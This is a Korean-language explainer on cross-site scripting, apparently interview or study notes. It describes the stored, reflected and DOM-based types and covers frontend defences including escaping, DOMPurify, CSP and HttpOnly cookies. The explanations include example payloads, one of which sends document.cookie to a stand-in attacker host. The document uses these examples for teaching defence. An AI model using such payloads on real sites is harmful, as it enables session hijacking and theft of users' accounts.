## XSS 공격이란 무엇이며, 프론트엔드에서 이를 방어하기 위한 방법을 설명해주세요.

XSS(Cross-Site Scripting)는 웹 애플리케이션의 취약점 중 하나로, 공격자가 신뢰할 수 있는 웹사이트에 악의적인 스크립트를 삽입하여 다른 사용자의 브라우저에서 해당 스크립트가 실행되게 하는 공격 기법입니다.

### 피해 사례
* **쿠키 및 세션 토큰 탈취** : 사용자의 세션을 가로채 해당 사용자로 위장합니다.
* **개인 정보 유출** : 사용자의 개인 정보나 민감한 데티어를 훔칩니다.
* **피싱 사이트로 유도** : 가짜 로그인 페이지 등을 보여주어 사용자 계정 정보를 탈취합니다.
* **악성코드 설치 유도** : 사용자 모르게 악성코드를 다운로드하거나 설치하도록 유도합니다.
* **웹사이트 변조** : 사용자에게 보이는 웹 페이지의 내용을 임의로 변경합니다.

### 주요 공격 유형
#### **Stored XSS** 
* 악성 스크립트가 웹사이트의 데이터베이스나 파일 시스템과 같은 서버 측에 영구적으로 저장되어 다른 사용자가 해당 스크립트가 포함된 페이지를 방문할 때마다 브라우저에서 악성 스크립트가 실행됩니다.
* 공격자가 게시판 댓글에 `<script>document.location='http://attacker.com/cookie?c='+document.cookie'</script>`와 같은 스크립트를 삽입하고 다른 사용자가 댓글을 보면 해당 사용자의 쿠키가 공격자의 서버로 전송됩니다.
* 불특정 다수를 대상으로 공격할 수 있어 파급력이 큽니다.

#### **Reflected XSS**
* 악성 스크립트가 URL의 파라미터나 폼 입력 값 등을 통해 서버로 전달되고 서버가 이를 검증 없이 그대로 응답 페이지에 포함하여 사용자에게 반환할 때 발생합니다.
* 공격자가 `https://example.com/search?q=<script>alert('Reflected XSS!')</script>`와 같은 악성 링크를 만들어 사용자에게 이메일이나 메신저로 전송하고 사용자가 이 링크를 클릭하면 브라우저에게 경고창이 뜹니다.
* 스크립트가 서버에 저장되지 않으며 주로 피싱 공격 등 사용자를 속여 특정 링크를 클릭하게 하는 방식으로 이루어집니다.

#### **DOM-based XSS**
* 서버와는 무관하게 브라우저의 클라이언트 측 스크립트가 DOM을 동적으로 조작하는 과정에서 발생합니다. URL의 프래그먼트(`#`)나 클라이언트 측 스토리지 값을 읽어와 안전하지 않은 방식으로 DOM에 삽입할 때 발생합니다.
* `https://example.com/#<img src=x onerror=alert('DOM XSS')>`와 같은 URL에서 클라이언트 스크립트가 `#`뒤의 값을 가져와 `innerHTML`등을 사용해 페이지에 그대로 삽입하면 `onerror`이벤트가 실행됩니다.
* 서버 측에서는 탐지하기 어려우며 프론트엔드 코드의 안전성이 중요합니다.

### 프론트엔드에서 XSS 방어 방법
#### 출력 인코딩 / 이스케이핑
* 사용자로부터 입력받거나 외부에서 가져온 데이터를 HTML, JavaScript, CSS 등 특정 컨텍스트에 삽입할 때는 항상 해당 컨텐스트에 맞는 방식으로 인코딩/이스케이핑하여 데이터가 코드로 해석되지 않고 순수한 텍스트로 취급되도록 해야 합니다.
* `<` `>` `&` `"` `'`등의 특수 문자를 HTML 엔티티(`&lt;` `&gt;` `&quot;` `&#39;`)로 변환합니다.
* `element.textContent = data;`를 사용하면 자동으로 텍스트로 처리되므로 `element.innerHTML = data`보다 안전합니다.
* React, Vue, Angular 등 최신 프레임워크는 기본적으로 데이터를 렌더링할때 자동 이스케이핑을 수행합니다.
* href, src 등의 속성에 데이터를 넣을 때는 URL 인코딩을 적용해야 합니다.

#### HTML Santization
* 사용자가 HTML 형식의 입력을 해야 하는 경우 모든 HTML을 막는 대신 안전한 HTML 태그와 속성만 허용하고 위험한 태그(`<script>` `<object>` `<embed>`)나 속성(`onerror` `onclick`)을 제거하는 라이브러리를 사용합니다.
* 대표적인 라이브러리로 **DOMPurify**가 있습니다. `dangerouslySetInnerHTML`이나 `v-html`사용 시 DOMPurify를 통해 먼저 데이터를 정화하고 사용하는 것이 좋습니다.

#### 콘텐츠 보안 정책 (Content Security Policy)
* 웹 서버가 브라우저에게 신뢰할 수 있는 콘텐츠 소스를 알려주는 HTTP 헤더입니다.
* CSP를 설정하면 허용되지 않은 외부 스크립트의 실행, 인라인 스크립트 실행 등을 차단하여 XSS 공격의 피해를 크게 줄일 수 있습니다.

#### HttpOnly, Secure 쿠키 플래그 사용
* 서버에서 쿠키를 설정할 때 `HttpOnly`플래그를 사용하면 클라이언트 측 JavaScript에서 해당 쿠키에 접근하는 것을 막을 수 있습니다.
이는 XSS 공격으로 쿠키를 탈취하는 것을 효과적으로 방지합니다.
* `Secure`플래그는 HTTPS 연결에서만 쿠키가 전송되도록 하여 중간자 공격을 막습니다. 
